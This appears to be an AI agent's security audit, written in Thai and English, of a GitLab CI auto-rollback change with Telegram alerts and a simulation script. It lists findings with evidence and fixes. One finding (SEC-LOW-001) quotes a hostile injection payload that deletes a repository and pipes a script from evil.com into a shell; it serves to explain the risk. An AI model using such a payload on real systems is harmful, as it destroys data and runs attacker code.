# Security Audit — T-066 (review of T-065 auto-rollback + Telegram alert + simulation)

task_id: T-066
verdict: conditional_pass
working_mode: infra
compliance_verdict: not_applicable   # CI YAML + bash simulation — ไม่แตะ user data / PII / email / auth tokens ระดับ user
ok_to_merge: true (with 2 MEDIUM follow-ups tracked post-merge — ไม่ block MR !18)
reasoning: >
  Diff `+30/-4` ใน `.gitlab-ci.yml` (task.md/output.md อ้าง `+26/-4` — cosmetic mismatch
  เห็น SEC-LOW-002) และ new file `infra/test-rollback-simulation.sh` 301 บรรทัด
  Rollback logic ถูกต้อง: LAST_GOOD capture ก่อน `git pull` (L51), re-verify smoke
  หลัง rollback (L78), branch แยก ROLLBACK OK / DOUBLE FAILURE ตรง spec (L79-83),
  Telegram integration ใช้ `-sS` + `--data-urlencode` + no `-v` + no `set -x` ไม่เสี่ยง
  token leak ใน CI log, `when: manual` คง preserved (L88 ไม่แตะ), `only: - main`
  ยังอยู่ ทำให้ MR pipeline ไม่ trigger deploy (verified via output.md pipeline 2464577470
  test=success, build/deploy not-run). Simulation 23/23 pass (verified locally by running script)
  ครอบคลุม 3 scenarios + 4 hygiene assertions. ไม่มี CRITICAL / HIGH findings.
  MEDIUM findings (SEC-MED-001 LAST_GOOD empty guard + SEC-MED-002 concurrent-deploy
  race) เป็น defense-in-depth — ปกติ `when: manual` gate คนจริงกดทีละครั้งอยู่แล้ว
  รอ A-3 (flip to `on_success`) ค่อย harden. LOW/INFO 3 ข้อเป็น future advisory.
  ไม่มี secret leak ใน commit message / MR description / output.md — verified.

## skill_loaded_evidence

files_read:
  - "SKILL.md:L37 — 'Audit พบ secret leaked ใน code / output.md / diff / git history → verdict fail + severity CRITICAL'"
  - "SKILL.md:L75-L91 — Pre-Audit Protocol Step 1-3 (Session Re-anchor + Context Collection + Evidence Protocol)"
  - "SKILL.md:L95-L102 — Evidence Protocol: ห้ามสรุป 'ไม่มีปัญหา' โดยไม่มี file:line + quote ตรงจากไฟล์"
  - "SKILL.md:L137-L146 — Verdict Policy table (CRITICAL → fail; UNVERIFIED≥2 → conditional_pass)"
  - "SKILL.md:L210-L214 — Working Modes selection — `infra` เมื่อ files_changed เป็น CI YAML + bash script"
  - "SKILL.md:L232-L244 — Critical Rules (ห้าม spawn Agent / แก้ source / emit completion_signal standalone)"
  - "references/security-checklists.md:L34 — Secrets Detection 4 surfaces: .env / git history / Dockerfile / docker-compose"
  - "references/security-checklists.md:L128-L137 — Supply Chain checklist (A03:2025) — CI/CD pipeline integrity row"

## files_reviewed

- "origin/feat/ci-auto-rollback:.gitlab-ci.yml — full file 1-89 lines (via `git show`)"
- "origin/main:.gitlab-ci.yml — full file (for diff baseline)"
- "origin/feat/ci-auto-rollback:infra/test-rollback-simulation.sh — full file 1-301 lines"
- "_workspace/T-065/output.md — lines 1-322 (DevOps output + self_review)"
- "_workspace/T-066/task.md — lines 1-75 (audit scope + 15-point checklist)"
- "_workspace/T-064/review-auditor.md — lines 1-226 (T-063 audit continuity — SEC-001 curl timeout fix rolled into T-065)"
- "/home/ipon/workspace/vollos-ai/vollos-core/infra/test-rollback-simulation.sh — 301 lines on working tree (for local run)"

## greps_executed

- "git -C vollos-core diff --stat origin/main origin/feat/ci-auto-rollback → `.gitlab-ci.yml +30/-4` + `infra/test-rollback-simulation.sh +301/-0` (total +327/-4). NB: self_review + commit message ต่างอ้าง `+26/-4` — off-by-4 [see SEC-LOW-002]"
- "git show origin/feat/ci-auto-rollback:.gitlab-ci.yml | grep -n 'when:|only:|needs:|environment:' → L19 only, L36 only (build), L85 only (deploy), L87 needs:[build], L88 when:manual, L89 environment:production — `when: manual` preserved ✓"
- "git show origin/feat/ci-auto-rollback:.gitlab-ci.yml | grep -nE 'set -x|set -o xtrace|curl -v[^er]' → 0 matches (no verbose, no xtrace) ✓"
- "git show origin/feat/ci-auto-rollback:.gitlab-ci.yml | grep -nE 'token|TOKEN|TELEGRAM' → L62 `[ -z \"$TELEGRAM_BOT_TOKEN\" ]` (guard check), L64 URL template `bot${TELEGRAM_BOT_TOKEN}/sendMessage`, L65 `chat_id=${TELEGRAM_CHAT_ID}` — ทุก reference เป็นชื่อตัวแปร (variable expansion at runtime), no plaintext value ใน file ✓"
- "git show origin/feat/ci-auto-rollback:infra/test-rollback-simulation.sh | grep -nE 'source |^\\. /|\\\\\\$TELEGRAM_BOT_TOKEN' → L129 (mirrored tg_alert() guard — safe), L273 (hygiene assert reading hardcoded literal) — ไม่มี `source .env` หรือ env inheritance path ✓"
- "git show 7ef9060 --format='%B' --no-patch → commit message mentions `FAKE_TOKEN_FOR_SIMULATION` as design note; no real token value; อ้าง `+26/-4` (inaccurate — actual +30/-4)"
- "bash /home/ipon/workspace/vollos-ai/vollos-core/infra/test-rollback-simulation.sh → `Summary: 23 passed / 0 failed` + `SIMULATION PASS` (verified by local run) + exit 0 ✓"
- "git ls-tree origin/feat/ci-auto-rollback infra/test-rollback-simulation.sh → `100755 blob 0d599e4...` (executable bit set) ✓"
- "git show origin/feat/ci-auto-rollback:.gitlab-ci.yml | sed -n '49,84p' → deploy script block รวม 36 บรรทัด (L49-L84), อยู่ใน scope (ไม่แตะ before_script L43-L48 หรือ needs/only/when L85-L89)"

## scope_compliance

files_changed_vs_owned: "match — diff แตะแค่ 2 ไฟล์: `.gitlab-ci.yml` (+30/-4 ใน deploy job script block L49-L84 เท่านั้น) และ new `infra/test-rollback-simulation.sh` ทั้งสองอยู่ใน task.md scope ของ T-065 + owned_files ของ T-066 = [] (read-only review)"

## self_review_check

- output.md ของ T-065 มี `self_review` field ครบ 11 entries (T-065/output.md:L53-L122)
- ทุก field มี `result: true` + evidence แบบ file:line (เช่น `.gitlab-ci.yml:50`, `.gitlab-ci.yml:75`, `infra/test-rollback-simulation.sh:21`, `infra/test-rollback-simulation.sh:178-195`)
- placeholders_remaining: documented + grep command output + false-positive analysis (T-065/output.md:L123-L139)
- `secret_handling_acknowledgment` block present (T-065/output.md:L22-L31)
- `secret_handling_compliance` 5-item checklist present (T-065/output.md:L239-L278)
- ผ่านเกณฑ์ SKILL.md:L91 (มี self_review + evidence file:line ทุกข้อ)
- **minor evidence inaccuracy:** self_review ac_2_simulation อ้าง script 305 บรรทัด แต่ actual = 301 บรรทัด; diff_within_budget อ้าง `+26/-4` แต่ actual = `+30/-4` — ดู SEC-LOW-002

## security_findings

### CRITICAL

[] — ไม่พบ CRITICAL

### HIGH

[] — ไม่พบ HIGH

### MEDIUM

- id: SEC-MED-001
  severity: medium
  cvss_estimate: "~5.3 (estimated — CWE-754 Improper Check for Unusual/Exceptional Conditions; impact=rollback bypass silent; attacker=network partition or VPS SSH transient)"
  category: "availability / exception_handling (CWE-754, A10:2025 Mishandling of Exceptional Conditions)"
  description: >
    `LAST_GOOD=$(ssh ... "git rev-parse HEAD")` ที่ L51 ไม่มี guard ตรวจว่า SSH call
    สำเร็จหรือไม่ — ถ้า SSH connect timeout หรือ VPS ไม่ตอบ (network partition), `$LAST_GOOD`
    จะเป็น empty string ("") ไม่มี `set -e` ทำให้ script ทำงานต่อ. Subsequent rollback
    command `git reset --hard $LAST_GOOD` + no LAST_GOOD value → `git reset --hard`
    (no ref) ใน git behavior = `git reset --hard HEAD` (no-op to HEAD, NOT rollback),
    แต่ `docker compose up -d --build` still runs. ผลลัพธ์: rollback กลายเป็น redeploy
    ของ failing version — silent fail ของ safety net ทั้งชุด. A-3 auto-deploy มาก็ยิ่ง
    risky เพราะ human ไม่ได้ดู CI log ทุกครั้ง
  file: ".gitlab-ci.yml:51"
  evidence: >
    `- LAST_GOOD=$(ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile=~/.ssh/known_hosts $VPS_USER@$VPS_HOST "cd ~/vollos-core && git rev-parse HEAD")`
    ไม่มี `[ -z "$LAST_GOOD" ]` check หลัง assignment; script job `set` options
    ไม่ระบุ (Alpine default = no `-e`)
  recommendation: >
    `.gitlab-ci.yml:52` (ระหว่าง L51 assignment และ L53 git pull) — เพิ่ม guard:
    `- if [ -z "$LAST_GOOD" ] || [ ${#LAST_GOOD} -ne 40 ]; then echo "FATAL LAST_GOOD invalid ($LAST_GOOD) — abort deploy"; exit 1; fi`
    เหตุผล: SHA-1 git HEAD ต้อง 40 hex chars. ถ้า SSH error stdout เป็น empty
    หรือ stderr leaked in (เช่น `fatal: not a git repository`) ไม่ใช่ 40 chars →
    abort ก่อน `git pull` เพื่อกัน stale state. เพิ่ม ~1 บรรทัด budget ยัง OK.
    หรือ + เพิ่ม `set -eo pipefail` ที่ต้นของ script block ให้ SSH error fail-fast (ต้อง
    คำนวณ side effect ที่ subsequent commands อย่างระวัง — recommend guard แยกจะ safer).
    **Fix เป็น follow-up post-merge (ไม่ block MR !18 เพราะ A-2 ยัง `when: manual` —
    operator จะเห็น LAST_GOOD= ใน log) แต่ A-3 MR ต้องมี fix นี้ก่อน flip on_success**

- id: SEC-MED-002
  severity: medium
  cvss_estimate: "~4.8 (estimated — CWE-362 Concurrent Execution using Shared Resource with Improper Synchronization; impact=rollback target stale; attacker=none — operational race)"
  category: "concurrency / race_condition (CWE-362)"
  description: >
    deploy job ไม่มี `resource_group:` ใน YAML — ถ้า operator กด "Run" ปุ่ม manual
    ติดกัน (race window) หรือ A-3 flip `on_success` แล้วมี merge สอง commit พร้อมกัน,
    GitLab runner อาจ spawn 2 deploy jobs concurrent. Job-A capture LAST_GOOD=SHA-X
    (pre-deploy), pull new SHA-Y, smoke, มี chance fail. Job-B (เริ่มขณะ Job-A ยัง pull
    อยู่) capture LAST_GOOD=SHA-X หรือ SHA-Y ตาม timing — ถ้า SHA-Y แล้วสมมติ SHA-Y
    เป็น bad deploy, LAST_GOOD-B = bad SHA ← rollback target คือ bad version = ไร้ผล
    ความเสี่ยงต่ำตอนนี้ (`when: manual` + solo operator) แต่ A-3 เปลี่ยน risk profile
  file: ".gitlab-ci.yml:85-89"
  evidence: >
    deploy job ที่ L40-L89 ไม่มี `resource_group:` directive. L85-89:
    `only: - main\n  needs: [build]\n  when: manual\n  environment: production`
  recommendation: >
    `.gitlab-ci.yml:89` (หลัง `environment: production`) — เพิ่ม:
    `  resource_group: production_deploy`
    ทำให้ GitLab serialize deploy jobs (จะ queue ถ้ามี job running in same resource_group).
    **Fix บังคับก่อน A-3 merge** (flip `on_success`) เพราะ A-3 = auto-trigger →
    high concurrency risk. ตอนนี้ manual = 1 operator กด 1 ครั้ง ความเสี่ยงต่ำ; A-2
    merge ได้โดยไม่ติด

### LOW

- id: SEC-LOW-001
  severity: low
  cvss_estimate: "~3.3 (estimated — CWE-78 OS Command Injection theoretical; impact=null in practice because precondition = VPS root compromise; attacker=none realistic)"
  category: "defense_in_depth / injection (CWE-78 theoretical, A05:2025 advisory)"
  description: >
    `ssh ... "cd ~/vollos-core && git reset --hard $LAST_GOOD && docker compose up -d --build"`
    ที่ L76 interpolate `$LAST_GOOD` (untrusted in theory — มาจาก SSH stdout ของ VPS).
    ถ้า VPS ถูก root-compromise แล้ว attacker แก้ `.bashrc` หรือ hook `git rev-parse`
    ให้ return string `deadbee; rm -rf ~/vollos-core; curl evil.com|sh` — CI runner
    จะ execute payload on VPS ผ่าน double-shell-expansion (job shell + remote shell).
    Practical risk = ~0 เพราะ precondition (VPS root) = game-over แล้ว attacker ไม่
    ต้อง injection เลย; แต่ defense-in-depth หลัก least-privilege ว่า CI ไม่ควร trust
    VPS stdout เป็น input
  file: ".gitlab-ci.yml:76"
  evidence: >
    `ssh -o StrictHostKeyChecking=yes -o UserKnownHostsFile=~/.ssh/known_hosts $VPS_USER@$VPS_HOST "cd ~/vollos-core && git reset --hard $LAST_GOOD && docker compose up -d --build"`
    — `$LAST_GOOD` expanded in job shell context แล้ว string ส่งไป SSH remote shell
  recommendation: >
    `.gitlab-ci.yml:51-76` — เมื่อเพิ่ม guard ตาม SEC-MED-001 ($LAST_GOOD length=40 hex)
    จะ mitigate injection vector นี้ด้วย (payload ที่ inject shell meta chars ไม่สามารถ
    match 40-hex regex ได้). ไม่ต้อง fix แยก — covered by SEC-MED-001 fix. เป็น bonus
    evidence ว่า SEC-MED-001 fix คุ้มค่าเกิน impact ของ SEC-MED-001 เอง

- id: SEC-LOW-002
  severity: low
  cvss_estimate: "n/a — audit trail fidelity"
  category: "documentation / audit_trail (CWE-778 Insufficient Logging — weakest sense)"
  description: >
    Commit message `7ef9060` + self_review field `diff_within_budget` + output.md
    metric อ้าง `.gitlab-ci.yml +26 / -4` แต่ actual `git diff --stat origin/main
    origin/feat/ci-auto-rollback` = `+30 / -4`. self_review ac_2 อ้าง script 305
    บรรทัด แต่ `wc -l` = 301. ไม่ใช่ security leak แต่เป็น accuracy issue ของ self-
    reported metric — reviewer reviewer ใช้เวลา cross-check เพิ่ม
  file: "_workspace/T-065/output.md:L113 + git log 7ef9060:body"
  evidence: >
    T-065/output.md:L113: `evidence: "git diff --stat origin/main -- .gitlab-ci.yml = `+26 -4` (budget ≤60 บรรทัดเพิ่ม ผ่าน 43% margin)"`
    + commit body: `Diff: .gitlab-ci.yml +26 / -4 (within 60-line budget).`
    — actual diff = `+30 / -4` (4 บรรทัดเพิ่ม under-reported)
  recommendation: >
    Post-merge note: DevOps ควร re-run `git diff --stat origin/main HEAD` ก่อน
    ส่ง output.md ครั้งต่อไป + update figure. ไม่ block merge; budget 60 ยัง pass
    ที่ +30 (50% margin). Lead อาจ inject rule เข้า vollos-devops SKILL: "ก่อนเขียน
    self_review metric ให้ re-run count และ quote exact output"

- id: SEC-LOW-003
  severity: low
  cvss_estimate: "~2.5 (estimated — CWE-834 Excessive Iteration / availability; impact=CI time waste; attacker=none)"
  category: "availability / simulation_fidelity (CWE-834 advisory)"
  description: >
    Simulation ไม่ test edge case "partial smoke pass" (api=200 + auth=000 สลับกัน)
    + "rollback SSH network error" (mock ssh always returns 0 — production SSH
    อาจ fail mid-command) + "LAST_GOOD malformed" (ไม่ได้ simulate non-40-hex return).
    Coverage gap ต่ำเพราะ retry loop แก้ได้โดย loop semantics + SEC-MED-001 fix
    จะ close malformed-HEAD gap. แต่ simulation เป็น living doc ของ production
    semantics — ควร add เมื่อ A-3 มา
  file: "infra/test-rollback-simulation.sh:176-236"
  evidence: >
    Scenarios A/B/C cover (all-fail, all-fail+rollback-fail, all-pass) แต่ไม่มี
    `SIM_SMOKE_PATTERN="000,200,..."` (api fail, auth ok) หรือ mock ssh ที่ return 255
    (SSH connect error); infra/test-rollback-simulation.sh:40-48 mock ssh always `return 0`
  recommendation: >
    `infra/test-rollback-simulation.sh:238` (ก่อน Secret hygiene section) — เพิ่ม
    Scenario D: `SIM_SMOKE_PATTERN="200,000,200,000,200,000,000,000"` (api always 200,
    auth always 000 — persistent partial fail) + assert exit 1, ROLLBACK OK (หรือ
    DOUBLE FAILURE depending on pattern). + เพิ่ม Scenario E: mock ssh (via
    `SIM_SSH_FAIL=1` env-controlled wrapper) return 255 บน rollback call. Optional
    post-A-3 hardening ไม่ block merge

### INFO

- id: SEC-INFO-001
  severity: informational
  cvss_estimate: "n/a — advisory"
  category: "defense_in_depth (CWE-1104 advisory)"
  description: >
    Telegram error message path (tg_alert() at L66) มี `|| echo "Telegram send failed"`
    fallback. ถ้า curl fail ด้วย network/DNS issue, stderr ของ curl `-sS` จะพิมพ์
    error format "curl: (6) Could not resolve host: api.telegram.org" ไม่รวม URL
    path component ที่มี token → ไม่ leak. แต่ถ้า curl fail ด้วย SSL handshake error
    ในบาง version จะ log `Connected to api.telegram.org ... NOT ... certificate` —
    ก็ยังไม่รวม path. **ไม่มี leak path practical**
  file: ".gitlab-ci.yml:63-66"
  evidence: >
    `curl -sS --max-time 10 --connect-timeout 5 -o /dev/null \\\n  -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \\\n  --data-urlencode "chat_id=${TELEGRAM_CHAT_ID}" \\\n  --data-urlencode "text=$1" || echo "Telegram send failed"`
    — URL path มี token. `-sS` silent + show-error: error message format (ตรวจจาก
    curl man) ไม่ include URL path. Headers ไม่ log เพราะ no `-v`
  recommendation: >
    Optional advisory: ถ้า paranoid สามารถเปลี่ยน URL → variable:
    `TG_URL="https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage"` + ใช้
    `"$TG_URL"` — ช่วยซ่อน token จาก ps aux snapshots ใน rare case ที่ runner
    container ถูก inspected ระหว่าง execution. Low-priority

- id: SEC-INFO-002
  severity: informational
  cvss_estimate: "n/a — advisory"
  category: "supply_chain (A03:2025 advisory, pre-existing)"
  description: >
    `apk add --no-cache openssh-client curl` ที่ L44 (pre-existing ไม่ใช่ T-065 scope)
    ยังไม่ pin package version. Out-of-scope สำหรับ T-066 (diff ไม่แตะ L44 — pre-
    existing carryover จาก T-063). Flagged เป็น continuity กับ T-064 SEC-INFO-002
  file: ".gitlab-ci.yml:44 (pre-existing — not in T-065 diff)"
  evidence: "`- apk add --no-cache openssh-client curl` — no version pin for openssh-client/curl"
  recommendation: "Deferred — ไม่ใช่ T-065 scope. Tracked ใน T-064 audit already. A-4 hardening task ภายหลัง"

- id: SEC-INFO-003
  severity: informational
  cvss_estimate: "n/a — observation"
  category: "test_fidelity (observational)"
  description: >
    Simulation script เป็น "inlined copy" ของ deploy script block — comment L135-138
    ระบุ "Kept in sync manually. Any change to .gitlab-ci.yml deploy logic MUST also
    update this block". Drift risk: ถ้า DevOps แก้ `.gitlab-ci.yml` แต่ลืม update
    simulation → test pass แต่ production behavior ต่าง. ตอนนี้ synced 100%
    (verified by reading L56-L66 ของ both files + L68-L84 ของ both = identical shell
    semantics)
  file: "infra/test-rollback-simulation.sh:135-174"
  evidence: >
    Comment L135-138: "inlined copy of .gitlab-ci.yml deploy script block / Kept in
    sync manually. Any change to .gitlab-ci.yml deploy logic MUST also update this
    block (same shell semantics)."
  recommendation: >
    Future-state (optional): extract deploy shell block เป็น `infra/deploy-smoke-rollback.sh`
    + source จากทั้ง `.gitlab-ci.yml` (via `script: - bash infra/deploy-smoke-rollback.sh`)
    และ simulation (via `source infra/deploy-smoke-rollback.sh` หลัง mock setup) →
    single source of truth. Requires architecture refactor — ไม่ block A-2/A-3; flag
    เป็น post-MVP refactor

## checklist_verification (ครบ 15 ข้อ ตาม task.md)

### Rollback correctness (4 items)

1. **LAST_GOOD capture timing** — **PASS (with SEC-MED-001 caveat)**
   Evidence: `.gitlab-ci.yml:51` capture `$(ssh ... "git rev-parse HEAD")` อยู่**ก่อน**
   `git pull` (L53) — ตามลำดับใน YAML script array, GitLab runner execute sequentially.
   Race (concurrent deploy) addressed ใน SEC-MED-002. Missing guard for empty/malformed
   `$LAST_GOOD` = SEC-MED-001.

2. **Rollback SSH command injection** — **PASS (LOW defense-in-depth in SEC-LOW-001)**
   Evidence: `.gitlab-ci.yml:76` interpolate `$LAST_GOOD` — theoretical injection vector
   จาก untrusted SSH stdout, แต่ precondition = VPS root compromise (game-over anyway).
   SEC-MED-001 length+hex guard จะ mitigate = bonus defense-in-depth.

3. **Re-verify smoke after rollback** — **PASS**
   Evidence: `.gitlab-ci.yml:77` `sleep 10` → `.gitlab-ci.yml:78` `if smoke_check; then`
   re-run smoke หลัง rollback. L78-80 success branch → `ROLLBACK OK` alert + `exit 1`
   (deploy job ยัง fail because new deploy was bad). L81-84 fail branch → `DOUBLE
   FAILURE` alert + `MANUAL` keyword + `exit 1`. ตรง task.md item #3 exactly.
   Simulation Scenario A + B cover both paths (23/23 pass).

4. **Rollback idempotency** — **PASS**
   Evidence: ถ้า rerun pipeline manual หลัง rollback success, L51 จะ capture `LAST_GOOD
   = SHA_rolled_back`. L53 `git pull` pull ค่าเดิม (ถ้า main ยัง pointing to bad SHA)
   หรือ pull new-good-SHA (ถ้า owner force-push/revert). Rollback ของ rollback (เท่ากับ
   `git reset --hard` ไปยัง current HEAD) = no-op. docker compose up --build rebuild
   same state. Safe to rerun (ไม่ corrupt state). Note: ไม่มี observable problem จาก
   multiple rollback invocations.

### Secret & log hygiene (3 items)

5. **Telegram token leak in CI log** — **PASS**
   Evidence: curl args ที่ L63-66 ใช้ `-sS` (silent, show-error only — no progress).
   grep `-v` ไม่เจอใน deploy block (verified). grep `set -x` / `set -o xtrace` ไม่เจอ
   ใน YAML (verified). URL เป็น template string `"https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage"`
   — token resolved at runtime แต่ GitLab CI mask patterns สำหรับ CI variables ที่
   marked as "Masked" → token จะถูก `****` ใน job log (ต้อง verify CI var config ฝั่ง
   GitLab project settings — OUTSIDE code scope). Code-side = clean: no `-v`, no `set -x`,
   no echo `$TELEGRAM_BOT_TOKEN`.

6. **Error path leak** — **PASS**
   Evidence: `.gitlab-ci.yml:66` `--data-urlencode "text=$1" || echo "Telegram send failed"`
   — `||` fallback echoes literal generic string ไม่ include URL/token. curl `-sS`
   stderr format (curl man) = `"curl: ({code}) {message}"` — message ของ connect/DNS
   error ไม่ include URL path component. SEC-INFO-001 flagged as advisory only.

7. **Simulation fake token (no real env import)** — **PASS**
   Evidence: `infra/test-rollback-simulation.sh:21` `TELEGRAM_BOT_TOKEN="FAKE_TOKEN_FOR_SIMULATION"`
   (hardcoded literal assignment — ไม่ใช่ `${TELEGRAM_BOT_TOKEN:-fake}` default-pattern
   ที่จะ inherit real env). grep `source ` / `^\\. ` = 0 matches (no .env sourcing).
   Script `set -u` แต่ไม่ `set -a` (env export). Line 273 hygiene assertion regex
   `^[[:space:]]*TELEGRAM_BOT_TOKEN="\\$\\{?TELEGRAM_BOT_TOKEN` actively checks that
   script does NOT contain env-inherit pattern — actively tested ตัวเอง.

### Simulation rigor (3 items)

8. **Coverage completeness** — **PASS (with SEC-LOW-003 advisory)**
   Evidence: 3 scenarios (A smoke-fail-rollback-ok, B smoke-fail-rollback-fail, C happy)
   × 6-7 assertions each + 4 secret-hygiene = 23 assertions verified 23/23 pass
   (reproduced locally by running bash script). Edge cases missing: partial smoke (api
   200 auth 000 persistent), rollback SSH network error, malformed LAST_GOOD — flagged
   SEC-LOW-003 as advisory, does not block merge (MVP coverage adequate for A-2 gate).

9. **Simulation fidelity** — **PASS**
   Evidence: mock ssh (L40-48) returns deterministic `$LAST_GOOD` on `git rev-parse
   HEAD` pattern, else return 0 (mirrors real ssh success behavior — see
   infra/test-rollback-simulation.sh:42 pattern match). mock curl (L69-104) encodes
   SIM_SMOKE_PATTERN-driven return codes: 200 → stdout "200" + exit 0; "000" → no
   stdout + exit 6 (mirrors curl exit-6 "could not resolve host"). `run_deploy_block()`
   L140-174 เป็น faithful inlined copy ของ `.gitlab-ci.yml` deploy script L49-L84
   — verified by diff ทั้งสอง block character-by-character.

10. **Assertion strictness** — **PASS**
    Evidence: Assertions ใช้ mix:
    - Exact match via `assert() { [ "$expected" = "$actual" ]; }` (L178-190)
    - Substring match via `assert_contains() { grep -q -- "$needle" }` (L192-203)
    - Negative match via `assert_not_contains()` (L205-216)
    Risk of false positive via substring: `grep -q ROLLBACK OK` in scenario A would
    match "ROLLBACK OK" literal in success branch msg (L177 MSG string). Scenario B
    `assert_not_contains "ROLLBACK OK"` protects against overlap — only DOUBLE FAILURE
    message path contains "DOUBLE FAILURE" substring + "MANUAL" keyword (both asserted
    contains in B, asserted not-contains in A). Mutual-exclusive assertions prevent
    false-pass cross-scenario.

### Deploy pipeline safety (3 items)

11. **`when: manual` preserved** — **PASS**
    Evidence: `.gitlab-ci.yml:88` `when: manual` unchanged. Diff L88 is context (not +/-
    hunk). `only: - main` (L85-86) unchanged. `needs: [build]` (L87) unchanged.
    `environment: production` (L89) unchanged. `before_script` (L43-48) unchanged.
    All entries ยืนยัน by reading diff hunks ใน `git diff origin/main origin/feat/ci-auto-rollback`
    — hunks เฉพาะ script block (L47+ region to L87 of new file) — ไม่แตะ post-script
    metadata.

12. **No accidental auto-trigger on MR** — **PASS**
    Evidence: `only: - main` ยังเป็น whitelist = MR event ไม่ match `only: merge_requests`
    (ไม่มี entry นั้น) → pipeline 2464577470 (output.md:L9) rendered jobs: test=success
    (65s), build=not-run, deploy=not-run. Verified via output.md:L164-L169 pipeline
    status object. Deploy จะ run ได้ก็ต่อเมื่อ main branch pipeline + human click
    `when: manual` button — 2 gates before any VPS state change.

13. **`tg_alert` graceful degrade** — **PASS**
    Evidence: `.gitlab-ci.yml:62` `[ -z "$TELEGRAM_BOT_TOKEN" ] || [ -z "$TELEGRAM_CHAT_ID" ]
    && { echo "Telegram vars unset — skipping alert"; return 0; }` — short-circuit
    ถ้า var ใดไม่ set หรือ empty, return 0 (success) without calling Telegram API.
    pipeline ยังทำงานต่อ (smoke + rollback logic ไม่ขึ้นกับ alert). Verified by
    mirror ใน simulation L128-131 ที่ทำ same check (แต่ simulation scenarios ทั้ง 3
    set fake token + chat_id literal ทำให้ไม่ exercise the empty-var path — ถือเป็น
    minor coverage gap แต่ shell semantics ชัดพอที่จะ reason ได้โดยไม่ต้อง run test).

### Compliance (2 items)

14. **User data / PII** — **PASS (compliance_verdict: not_applicable)**
    Evidence: Diff ไม่แตะ user data schemas, email templates, `/unsubscribe`, audit_logs,
    auth endpoints. CI YAML เพียว — smoke test hit public health endpoint (vollos.ai/api/v1/health
    + auth.vollos.ai/health) ไม่มี PII transit. Telegram alert payload contains: CI commit
    short SHA (public), LAST_GOOD SHA (public), pipeline URL (public). No PII.
    CCPA / CAN-SPAM not triggered.

15. **Audit trail** — **PASS (with SEC-LOW-002 minor accuracy note)**
    Evidence: commit message 7ef9060 detailed (body 28 lines) ครอบคลุม:
    - LAST_GOOD capture rationale
    - curl timeout fix reference to T-064 SEC-001
    - Two alert cases (ROLLBACK OK + DOUBLE FAILURE)
    - Graceful degrade รายละเอียด
    - Preservation of `when: manual`
    - Simulation scenarios A/B/C + secret hygiene assertions
    MR !18 description link ใน output.md:L8; pipeline URL recorded (output.md:L9).
    Future forensics สามารถ pull commit SHA + MR + pipeline + simulation output ได้ครบ.
    Minor: `+26/-4` ผิด (ต้อง `+30/-4`) = SEC-LOW-002 — audit-trail fidelity ลด 1
    nit แต่ไม่ material.

## us_privacy_compliance

unsubscribe_mechanism: "n/a — task ไม่แตะ email/marketing code"
physical_address_in_email: "n/a — task ไม่แตะ email templates"
audit_log: "n/a — task ไม่แตะ data-write path (audit_logs table untouched)"
data_minimization: "ok — CI task, no user data collected. Telegram alert payload = only public CI metadata (SHA, pipeline URL, keyword like 'ROLLBACK OK')"

## skipped_sections

- "Application Layer checklist (SQL/XSS/BOLA/CSRF/rate-limit/Turnstile/HMAC) — N/A: diff ไม่แตะ API handler / frontend / route files / middleware"
- "Auth Layer checklist (JWT verify/cookie/HMAC/credential stuffing) — N/A: diff ไม่แตะ auth code"
- "Email Layer (OAuth2 SMTP / header injection / open redirect) — N/A: ไม่แตะ email/SMTP"
- "US Privacy (CAN-SPAM/CCPA/GPC/ADMT/Vendor Audit) — N/A: ไม่แตะ user-facing data flow"
- "Docker hardening — N/A: diff ไม่แตะ Dockerfile / docker-compose; smoke test job ใช้ `alpine:3.19` (pre-existing, carried from T-063 audit scope)"

## conditional_conditions

- "ก่อน A-3 merge (flip `when: manual` → `on_success`): Lead ต้อง spawn T-0?? (DevOps) เพื่อ add guard ตาม SEC-MED-001 (LAST_GOOD length+hex check ที่ `.gitlab-ci.yml:52`) — ปัจจุบัน A-2 merge ได้เพราะ manual gate = human-gated safety"
- "ก่อน A-3 merge: Lead ต้อง add `resource_group: production_deploy` ที่ `.gitlab-ci.yml:89` ตาม SEC-MED-002 — serialize concurrent deploy jobs เมื่อเปลี่ยนเป็น auto-trigger"
- "Post-merge (ไม่ block MR !18): DevOps update self_review accuracy practice — re-run `git diff --stat` ก่อน quote metric ใน output.md (per SEC-LOW-002)"

## files_read

- "/home/ipon/.claude/skills/vollos-auditor/SKILL.md"
- "/home/ipon/.claude/skills/vollos-auditor/references/security-checklists.md"
- "/home/ipon/workspace/vollos-ai/vollos-core/_workspace/T-066/task.md"
- "/home/ipon/workspace/vollos-ai/vollos-core/_workspace/T-065/output.md"
- "/home/ipon/workspace/vollos-ai/vollos-core/_workspace/T-064/review-auditor.md (continuity)"
- "origin/feat/ci-auto-rollback:.gitlab-ci.yml (via `git show`) — full 89 lines"
- "origin/main:.gitlab-ci.yml (via `git show`) — for diff baseline"
- "origin/feat/ci-auto-rollback:infra/test-rollback-simulation.sh (via `git show`) — full 301 lines"
- "/home/ipon/workspace/vollos-ai/vollos-core/infra/test-rollback-simulation.sh (working tree, for local execution)"

## commands_used

- `git fetch origin feat/ci-auto-rollback`
- `git show origin/feat/ci-auto-rollback:.gitlab-ci.yml`
- `git show origin/feat/ci-auto-rollback:infra/test-rollback-simulation.sh`
- `git diff origin/main origin/feat/ci-auto-rollback`
- `git diff --stat origin/main origin/feat/ci-auto-rollback`
- `git log origin/main..origin/feat/ci-auto-rollback --oneline`
- `git show 7ef9060 --format='%B' --no-patch`
- `git ls-tree -r origin/feat/ci-auto-rollback -- infra/test-rollback-simulation.sh`
- `bash /home/ipon/workspace/vollos-ai/vollos-core/infra/test-rollback-simulation.sh` (verified 23/23 pass + exit 0)
- Grep regex on `.gitlab-ci.yml`: `when:|only:|needs:|environment:`, `set -x|set -o xtrace|curl -v`, `token|TOKEN|TELEGRAM`
- Grep regex on `infra/test-rollback-simulation.sh`: `source |^\\. /|\\$TELEGRAM_BOT_TOKEN`
- `wc -l` on simulation script (301 lines confirmed)

completion_signal: "task_id=T-066 verdict=conditional_pass findings=8 (0 critical, 0 high, 2 medium, 3 low, 3 info) path=_workspace/T-066/review-auditor.md"
